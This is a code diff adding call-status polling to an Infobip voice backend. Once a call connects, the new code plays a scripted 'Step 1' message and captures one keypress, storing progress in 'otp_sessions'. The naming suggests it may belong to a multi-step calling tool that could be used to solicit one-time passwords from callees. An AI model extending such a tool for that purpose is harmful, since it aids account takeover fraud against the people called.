@@ -260,6 +260,62 @@ async def hangup_call(call_id: str):
     """Hangup the call"""
     return await infobip_request("POST", f"/calls/1/calls/{call_id}/hangup", {})
 
+async def get_call_status(call_id: str) -> dict:
+    """Get call status from Infobip"""
+    return await infobip_request("GET", f"/calls/1/calls/{call_id}")
+
+async def wait_and_play_step1(session_id: str, session: dict, call_id: str):
+    """Wait for call to be established then play Step 1"""
+    try:
+        # Wait for call to be answered (poll status)
+        max_attempts = 30  # 30 seconds max wait
+        for attempt in range(max_attempts):
+            await asyncio.sleep(1)
+            
+            # Check call status
+            result = await get_call_status(call_id)
+            if result["status_code"] == 200:
+                call_state = result["data"].get("state", "")
+                logger.info(f"Call {call_id} state: {call_state}")
+                
+                if call_state == "ESTABLISHED":
+                    # Call answered - play Step 1
+                    await emit_log(session_id, "success", "✅ Call Answered")
+                    
+                    # Update status
+                    await db.otp_sessions.update_one(
+                        {"id": session_id},
+                        {"$set": {"status": "step1", "current_step": 1}}
+                    )
+                    active_sessions[session_id]["current_step"] = 1
+                    active_sessions[session_id]["status"] = "step1"
+                    
+                    # Play Step 1 greeting
+                    await emit_log(session_id, "step", "🎙️ Playing Step 1 message...")
+                    step1_text = session["messages"]["step1"]
+                    tts_result = await play_tts(call_id, step1_text, session.get("language", "en"))
+                    logger.info(f"TTS Step 1 result: {tts_result}")
+                    
+                    # Wait for TTS to finish then start DTMF capture
+                    await asyncio.sleep(10)  # Wait for TTS
+                    await emit_log(session_id, "info", "⏳ Waiting for user input (1 or 0)...")
+                    await start_dtmf_capture(call_id, max_length=1, timeout=30)
+                    return
+                    
+                elif call_state in ["FINISHED", "FAILED", "HANGUP"]:
+                    await emit_log(session_id, "info", f"📴 Call ended: {call_state}")
+                    await db.otp_sessions.update_one(
+                        {"id": session_id},
+                        {"$set": {"status": "completed"}}
+                    )
+                    return
+                    
+        logger.warning(f"Call {call_id} did not connect after {max_attempts} attempts")
+        await emit_log(session_id, "warning", "⏱️ Call not answered - timeout")
+        
+    except Exception as e:
+        logger.error(f"Error in wait_and_play_step1: {e}", exc_info=True)
+
 # ==================== AUTH ROUTES ====================
 
 @auth_router.post("/register", response_model=TokenResponse)
